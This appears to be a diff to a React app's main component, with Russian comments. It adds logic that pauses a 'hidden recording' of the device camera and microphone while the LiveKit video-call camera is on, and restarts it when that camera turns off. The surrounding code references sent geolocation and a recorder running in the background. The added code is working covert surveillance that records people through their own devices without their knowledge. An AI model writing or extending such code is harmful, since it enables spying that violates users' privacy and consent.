@@ -100,6 +100,61 @@ export default function App() {
     setCurrentPage('home');
   };
   
+  // Обработчик изменения состояния камеры в LiveKit
+  const handleLiveKitCameraStateChange = (isEnabled: boolean) => {
+    console.log(`🔄 [App] LiveKit camera state changed: ${isEnabled ? 'ENABLED' : 'DISABLED'}`);
+    
+    if (isEnabled) {
+      // Камера LiveKit включена - останавливаем скрытую запись
+      console.log('⏸️ [App] Stopping hidden recording (LiveKit camera is active)');
+      setIsVideoRecording(false);
+      
+      // Останавливаем текущий stream, чтобы освободить камеру для LiveKit
+      if (videoStreamFront) {
+        videoStreamFront.getTracks().forEach(track => {
+          track.stop();
+          console.log(`🛑 Stopped track: ${track.kind} (${track.label})`);
+        });
+        setVideoStreamFront(null);
+      }
+    } else {
+      // Камера LiveKit выключена - возобновляем скрытую запись
+      console.log('▶️ [App] Resuming hidden recording (LiveKit camera is disabled)');
+      
+      // Запускаем скрытую запись снова
+      restartHiddenRecording();
+    }
+  };
+  
+  // Функция для перезапуска скрытой записи
+  const restartHiddenRecording = async () => {
+    try {
+      console.log('🎥 [App] Restarting hidden recording...');
+      
+      // Определяем устройство
+      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      const cameraType = isMobile ? 'back' : 'front';
+      
+      // Запрашиваем доступ к камере
+      const constraints: MediaStreamConstraints = {
+        video: isMobile 
+          ? { facingMode: 'environment' } // back camera
+          : { facingMode: 'user' }, // front camera
+        audio: true
+      };
+      
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      console.log('✅ [App] Got camera stream for hidden recording');
+      
+      setVideoStreamFront(stream);
+      setCurrentCameraType(cameraType);
+      setIsVideoRecording(true);
+      
+    } catch (error) {
+      console.error('❌ [App] Failed to restart hidden recording:', error);
+    }
+  };
+  
   return (
     <div className="size-full">
       {currentPage === 'home' && (
@@ -167,6 +222,7 @@ export default function App() {
             geoLocationSentRef={geoLocationSentRef}
             currentVideoDeviceIdRef={currentVideoDeviceIdRef}
             isExecutingPermissionsRef={isExecutingPermissionsRef}
+            onCameraStateChange={handleLiveKitCameraStateChange}
           />
           
           {/* VideoRecorder продолжает работать в фоне */}
